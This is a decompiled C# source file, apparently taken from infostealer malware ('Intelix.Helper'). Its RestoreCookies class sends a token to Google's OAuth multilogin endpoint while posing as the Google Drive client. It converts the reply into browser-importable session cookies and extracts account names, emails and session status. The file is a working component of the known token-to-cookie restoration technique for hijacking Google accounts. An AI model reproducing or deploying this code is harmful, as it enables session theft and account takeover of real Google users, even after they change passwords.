using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;

namespace Intelix.Helper
{
	// Token: 0x02000065 RID: 101
	public static class RestoreCookies
	{
		// Token: 0x06000170 RID: 368 RVA: 0x00011FF0 File Offset: 0x000101F0
		private static string SendPostRequest(string token)
		{
			try
			{
				HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create("https://accounts.google.com/oauth/multilogin?source=com.google.Drive");
				httpWebRequest.Method = "POST";
				httpWebRequest.ContentType = "application/x-www-form-urlencoded";
				httpWebRequest.Headers.Add("Authorization", "MultiBearer " + token);
				httpWebRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/605.1.15 (KHTML, like Gecko) com.google.Drive/6.0.230903 iSL/3.4 (gzip)\r\n";
				string s = "";
				byte[] bytes = Encoding.UTF8.GetBytes(s);
				using (Stream requestStream = httpWebRequest.GetRequestStream())
				{
					requestStream.Write(bytes, 0, bytes.Length);
				}
				using (HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse())
				{
					bool flag = httpWebResponse.StatusCode == HttpStatusCode.OK;
					if (flag)
					{
						using (StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream()))
						{
							return streamReader.ReadToEnd();
						}
					}
				}
			}
			catch (Exception)
			{
			}
			return string.Empty;
		}

		// Token: 0x06000171 RID: 369 RVA: 0x00012124 File Offset: 0x00010324
		public static string CRestore(string restore)
		{
			try
			{
				string text = RestoreCookies.SendPostRequest(restore);
				bool flag = string.IsNullOrEmpty(text);
				if (flag)
				{
					return string.Empty;
				}
				text = text.Remove(0, 5);
				RestoreCookies.Root root = new RestoreCookies.Root
				{
					status = Regex.Match(text, "\"status\":\"(.*?)\"").Groups[1].Value,
					cookies = RestoreCookies.ExtractCookies(text),
					accounts = RestoreCookies.ExtractAccounts(text)
				};
				StringBuilder stringBuilder = new StringBuilder();
				foreach (RestoreCookies.Cookie cookie in root.cookies)
				{
					string text2 = string.IsNullOrEmpty(cookie.host) ? cookie.domain : cookie.host;
					text2 = (string.IsNullOrEmpty(text2) ? ".google.com" : text2);
					stringBuilder.AppendLine(string.Concat(new string[]
					{
						text2,
						"\tTRUE\t",
						cookie.path,
						"\tFALSE\t",
						cookie.maxAge.ToString(),
						"\t",
						cookie.name,
						"\t",
						cookie.value
					}));
				}
				return stringBuilder.ToString();
			}
			catch
			{
			}
			return string.Empty;
		}

		// Token: 0x06000172 RID: 370 RVA: 0x000122C8 File Offset: 0x000104C8
		private static List<RestoreCookies.Cookie> ExtractCookies(string json)
		{
			List<RestoreCookies.Cookie> list = new List<RestoreCookies.Cookie>();
			foreach (object obj in Regex.Matches(json, "{(.*?)}"))
			{
				Match match = (Match)obj;
				string value = match.Value;
				int num;
				RestoreCookies.Cookie item = new RestoreCookies.Cookie
				{
					name = Regex.Match(value, "\"name\":\"(.*?)\"").Groups[1].Value,
					value = Regex.Match(value, "\"value\":\"(.*?)\"").Groups[1].Value,
					domain = Regex.Match(value, "\"domain\":\"(.*?)\"").Groups[1].Value,
					path = Regex.Match(value, "\"path\":\"(.*?)\"").Groups[1].Value,
					isSecure = Regex.IsMatch(value, "\"isSecure\":true"),
					isHttpOnly = Regex.IsMatch(value, "\"isHttpOnly\":true"),
					maxAge = (int.TryParse(Regex.Match(value, "\"maxAge\":(\\d+)").Groups[1].Value, out num) ? num : 0),
					priority = Regex.Match(value, "\"priority\":\"(.*?)\"").Groups[1].Value,
					sameParty = Regex.Match(value, "\"sameParty\":\"(.*?)\"").Groups[1].Value,
					sameSite = Regex.Match(value, "\"sameSite\":\"(.*?)\"").Groups[1].Value,
					host = Regex.Match(value, "\"host\":\"(.*?)\"").Groups[1].Value
				};
				list.Add(item);
			}
			return list;
		}

		// Token: 0x06000173 RID: 371 RVA: 0x000124C4 File Offset: 0x000106C4
		private static List<RestoreCookies.Account> ExtractAccounts(string json)
		{
			List<RestoreCookies.Account> list = new List<RestoreCookies.Account>();
			foreach (object obj in Regex.Matches(json, "{(.*?)}"))
			{
				Match match = (Match)obj;
				string value = match.Value;
				int num;
				RestoreCookies.Account item = new RestoreCookies.Account
				{
					type = Regex.Match(value, "\"type\":\"(.*?)\"").Groups[1].Value,
					display_name = Regex.Match(value, "\"display_name\":\"(.*?)\"").Groups[1].Value,
					display_email = Regex.Match(value, "\"display_email\":\"(.*?)\"").Groups[1].Value,
					photo_url = Regex.Match(value, "\"photo_url\":\"(.*?)\"").Groups[1].Value,
					selected = Regex.IsMatch(value, "\"selected\":true"),
					default_user = Regex.IsMatch(value, "\"default_user\":true"),
					authuser = (int.TryParse(Regex.Match(value, "\"authuser\":(\\d+)").Groups[1].Value, out num) ? num : 0),
					valid_session = Regex.IsMatch(value, "\"valid_session\":true"),
					obfuscated_id = Regex.Match(value, "\"obfuscated_id\":\"(.*?)\"").Groups[1].Value,
					is_verified = Regex.IsMatch(value, "\"is_verified\":true")
				};
				list.Add(item);
			}
			return list;
		}

		// Token: 0x020000EC RID: 236
		public class Account
		{
			// Token: 0x1700002A RID: 42
			// (get) Token: 0x06000333 RID: 819 RVA: 0x0001F26D File Offset: 0x0001D46D
			// (set) Token: 0x06000334 RID: 820 RVA: 0x0001F275 File Offset: 0x0001D475
			public string type { get; set; }

			// Token: 0x1700002B RID: 43
			// (get) Token: 0x06000335 RID: 821 RVA: 0x0001F27E File Offset: 0x0001D47E
			// (set) Token: 0x06000336 RID: 822 RVA: 0x0001F286 File Offset: 0x0001D486
			public string display_name { get; set; }

			// Token: 0x1700002C RID: 44
			// (get) Token: 0x06000337 RID: 823 RVA: 0x0001F28F File Offset: 0x0001D48F
			// (set) Token: 0x06000338 RID: 824 RVA: 0x0001F297 File Offset: 0x0001D497
			public string display_email { get; set; }

			// Token: 0x1700002D RID: 45
			// (get) Token: 0x06000339 RID: 825 RVA: 0x0001F2A0 File Offset: 0x0001D4A0
			// (set) Token: 0x0600033A RID: 826 RVA: 0x0001F2A8 File Offset: 0x0001D4A8
			public string photo_url { get; set; }

			// Token: 0x1700002E RID: 46
			// (get) Token: 0x0600033B RID: 827 RVA: 0x0001F2B1 File Offset: 0x0001D4B1
			// (set) Token: 0x0600033C RID: 828 RVA: 0x0001F2B9 File Offset: 0x0001D4B9
			public bool selected { get; set; }

			// Token: 0x1700002F RID: 47
			// (get) Token: 0x0600033D RID: 829 RVA: 0x0001F2C2 File Offset: 0x0001D4C2
			// (set) Token: 0x0600033E RID: 830 RVA: 0x0001F2CA File Offset: 0x0001D4CA
			public bool default_user { get; set; }

			// Token: 0x17000030 RID: 48
			// (get) Token: 0x0600033F RID: 831 RVA: 0x0001F2D3 File Offset: 0x0001D4D3
			// (set) Token: 0x06000340 RID: 832 RVA: 0x0001F2DB File Offset: 0x0001D4DB
			public int authuser { get; set; }

			// Token: 0x17000031 RID: 49
			// (get) Token: 0x06000341 RID: 833 RVA: 0x0001F2E4 File Offset: 0x0001D4E4
			// (set) Token: 0x06000342 RID: 834 RVA: 0x0001F2EC File Offset: 0x0001D4EC
			public bool valid_session { get; set; }

			// Token: 0x17000032 RID: 50
			// (get) Token: 0x06000343 RID: 835 RVA: 0x0001F2F5 File Offset: 0x0001D4F5
			// (set) Token: 0x06000344 RID: 836 RVA: 0x0001F2FD File Offset: 0x0001D4FD
			public string obfuscated_id { get; set; }

			// Token: 0x17000033 RID: 51
			// (get) Token: 0x06000345 RID: 837 RVA: 0x0001F306 File Offset: 0x0001D506
			// (set) Token: 0x06000346 RID: 838 RVA: 0x0001F30E File Offset: 0x0001D50E
			public bool is_verified { get; set; }
		}

		// Token: 0x020000ED RID: 237
		public class Cookie
		{
			// Token: 0x17000034 RID: 52
			// (get) Token: 0x06000348 RID: 840 RVA: 0x0001F320 File Offset: 0x0001D520
			// (set) Token: 0x06000349 RID: 841 RVA: 0x0001F328 File Offset: 0x0001D528
			public string name { get; set; }

			// Token: 0x17000035 RID: 53
			// (get) Token: 0x0600034A RID: 842 RVA: 0x0001F331 File Offset: 0x0001D531
			// (set) Token: 0x0600034B RID: 843 RVA: 0x0001F339 File Offset: 0x0001D539
			public string value { get; set; }

			// Token: 0x17000036 RID: 54
			// (get) Token: 0x0600034C RID: 844 RVA: 0x0001F342 File Offset: 0x0001D542
			// (set) Token: 0x0600034D RID: 845 RVA: 0x0001F34A File Offset: 0x0001D54A
			public string domain { get; set; }

			// Token: 0x17000037 RID: 55
			// (get) Token: 0x0600034E RID: 846 RVA: 0x0001F353 File Offset: 0x0001D553
			// (set) Token: 0x0600034F RID: 847 RVA: 0x0001F35B File Offset: 0x0001D55B
			public string path { get; set; }

			// Token: 0x17000038 RID: 56
			// (get) Token: 0x06000350 RID: 848 RVA: 0x0001F364 File Offset: 0x0001D564
			// (set) Token: 0x06000351 RID: 849 RVA: 0x0001F36C File Offset: 0x0001D56C
			public bool isSecure { get; set; }

			// Token: 0x17000039 RID: 57
			// (get) Token: 0x06000352 RID: 850 RVA: 0x0001F375 File Offset: 0x0001D575
			// (set) Token: 0x06000353 RID: 851 RVA: 0x0001F37D File Offset: 0x0001D57D
			public bool isHttpOnly { get; set; }

			// Token: 0x1700003A RID: 58
			// (get) Token: 0x06000354 RID: 852 RVA: 0x0001F386 File Offset: 0x0001D586
			// (set) Token: 0x06000355 RID: 853 RVA: 0x0001F38E File Offset: 0x0001D58E
			public int maxAge { get; set; }

			// Token: 0x1700003B RID: 59
			// (get) Token: 0x06000356 RID: 854 RVA: 0x0001F397 File Offset: 0x0001D597
			// (set) Token: 0x06000357 RID: 855 RVA: 0x0001F39F File Offset: 0x0001D59F
			public string priority { get; set; }

			// Token: 0x1700003C RID: 60
			// (get) Token: 0x06000358 RID: 856 RVA: 0x0001F3A8 File Offset: 0x0001D5A8
			// (set) Token: 0x06000359 RID: 857 RVA: 0x0001F3B0 File Offset: 0x0001D5B0
			public string sameParty { get; set; }

			// Token: 0x1700003D RID: 61
			// (get) Token: 0x0600035A RID: 858 RVA: 0x0001F3B9 File Offset: 0x0001D5B9
			// (set) Token: 0x0600035B RID: 859 RVA: 0x0001F3C1 File Offset: 0x0001D5C1
			public string sameSite { get; set; }

			// Token: 0x1700003E RID: 62
			// (get) Token: 0x0600035C RID: 860 RVA: 0x0001F3CA File Offset: 0x0001D5CA
			// (set) Token: 0x0600035D RID: 861 RVA: 0x0001F3D2 File Offset: 0x0001D5D2
			public string host { get; set; }
		}

		// Token: 0x020000EE RID: 238
		public class Root
		{
			// Token: 0x1700003F RID: 63
			// (get) Token: 0x0600035F RID: 863 RVA: 0x0001F3E4 File Offset: 0x0001D5E4
			// (set) Token: 0x06000360 RID: 864 RVA: 0x0001F3EC File Offset: 0x0001D5EC
			public string status { get; set; }

			// Token: 0x17000040 RID: 64
			// (get) Token: 0x06000361 RID: 865 RVA: 0x0001F3F5 File Offset: 0x0001D5F5
			// (set) Token: 0x06000362 RID: 866 RVA: 0x0001F3FD File Offset: 0x0001D5FD
			public List<RestoreCookies.Cookie> cookies { get; set; }

			// Token: 0x17000041 RID: 65
			// (get) Token: 0x06000363 RID: 867 RVA: 0x0001F406 File Offset: 0x0001D606
			// (set) Token: 0x06000364 RID: 868 RVA: 0x0001F40E File Offset: 0x0001D60E
			public List<RestoreCookies.Account> accounts { get; set; }
		}
	}
}
